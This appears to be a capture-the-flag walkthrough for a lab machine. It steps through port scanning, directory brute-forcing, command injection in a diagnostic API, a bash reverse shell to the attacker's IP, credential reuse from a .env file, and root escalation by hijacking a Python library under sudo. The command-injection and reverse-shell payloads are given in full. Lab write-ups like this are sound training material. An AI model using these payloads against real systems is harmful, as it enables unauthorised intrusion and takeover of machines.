### Phase 1: Reconnaissance & Enumeration

1.  **Run an Nmap Scan:**
    Identify the open ports and running services.
    ```bash
    nmap -sC -sV -p- <TARGET_IP>
    ```
    You will find three open ports: `22` (SSH), `80` (HTTP), and `8000` (HTTP).

2.  **Investigate the Web Servers:**
    * Navigating to `http://<TARGET_IP>:80` reveals a static "Coming Soon" page. It's a dead end.
    * Navigating to `http://<TARGET_IP>:8000` reveals a broken "Elevate Staging Portal" login page.

3.  **Directory Brute-Forcing:**
    Since the login page is a dead end, we need to find hidden directories.
    ```bash
    gobuster dir -u http://<TARGET_IP>:8000 -w /usr/share/wordlists/dirb/common.txt
    ```
    This reveals an `/api/` directory.

4.  **Fuzzing the API Directory:**
    Run `gobuster` again, specifically targeting the `/api/` path to find PHP files.
    ```bash
    gobuster dir -u http://<TARGET_IP>:8000/api -w /usr/share/wordlists/dirb/common.txt -x php
    ```
   

### Phase 2: Initial Foothold (Command Injection)

1.  **Interact with the API:**
    If you visit the endpoint in your browser, it tells you it requires a POST request. If you send an empty POST request, it tells you it is missing the `target` parameter.

2.  **Test the Injection:**
    Since it's a "diagnostic" script, it is likely running a system command like `ping`. We can test for command injection by appending a command (`; id`) to an IP address using `curl`.
    ```bash
    curl -X POST http://<TARGET_IP>:8000/api/diagnostic.php -d "target=127.0.0.1; id"
    ```
    The server responds with the ping output, followed immediately by `uid=33(www-data) gid=33(www-data)...`. You have Remote Code Execution (RCE).

3.  **Catch a Reverse Shell:**
    Set up a Netcat listener on your Kali machine:
    ```bash
    nc -lvnp 4444
    ```
    Send a reverse shell payload via `curl`. (Replace `<YOUR_KALI_IP>` with your actual attacker IP).
    ```bash
    curl -X POST http://<TARGET_IP>:8000/api/diagnostic.php -d "target=127.0.0.1; bash -c 'bash -i >& /dev/tcp/<YOUR_KALI_IP>/4444 0>&1'"
    ```
    Check your Netcat window. You now have a low-privileged shell as `www-data`.

### Phase 3: Lateral Movement (Credential Harvesting)

As `www-data`, your goal is to pivot to a legitimate user account.

1.  **Enumerate the Web Directory:**
    Navigate to the root of the staging environment to look for configuration files.
    ```bash
    cd /var/www/dev
    ls -la
    ```

2.  **Discover the Credentials:**
    You will see a hidden `.env` file. Read its contents:
    ```bash
    cat .env
    ```
    You will find the active database credentials left by the developer:


3.  **SSH as Alex:**
    Developers frequently reuse passwords. Open a new terminal on your Kali machine and SSH directly into the box using the credentials you just found.
    ```bash
    ssh alex@<TARGET_IP>
    # Enter password
    ```

4.  **Capture the User Flag:**
    ```bash
    cat /home/alex/user.txt
    ```

### Phase 4: Privilege Escalation (Python Library Hijacking)

Now we need to escalate from `alex` to `root`.

1.  **Check Sudo Privileges:**
    Always check what commands your current user can run with elevated privileges.
    ```bash
    sudo -l
    ```
    You will see the following output:
    `(root) NOPASSWD: /usr/bin/python3 /opt/elevate_monitor.py`

2.  **Investigate the Target Script & Permissions:**
    Read the script: `cat /opt/elevate_monitor.py`. You'll see it imports standard libraries: `os` and `random`.
    Check the directory permissions where the script is located: `ls -ld /opt/`. 
    The permissions are `drwxrwxr-x`, and the group owner is `alex`. **This means you have write access to `/opt/`.**

3.  **Execute the Hijack:**
    When a Python script runs, it checks its current working directory for imported modules before checking the system-wide libraries. Because you can write to `/opt/`, you can create a fake library file.
    
    Create a fake `random.py` file:
    ```bash
    nano /opt/random.py
    ```
    Add a payload to spawn a system shell:
    ```python
    import os
    os.system("/bin/bash")
    ```
    Save and exit (`Ctrl+X`, `Y`, `Enter`).

4.  **Trigger the Exploit:**
    Run the monitor script using `sudo` exactly as permitted:
    ```bash
    sudo /usr/bin/python3 /opt/elevate_monitor.py
    ```
    The script executes as root, attempts to `import random`, hits your malicious file instead of the system library, and drops you into a new shell.

5.  **Verify and Capture the Root Flag:**
    ```bash
    whoami
    # Output: root
    cat /root/root.txt
    ```
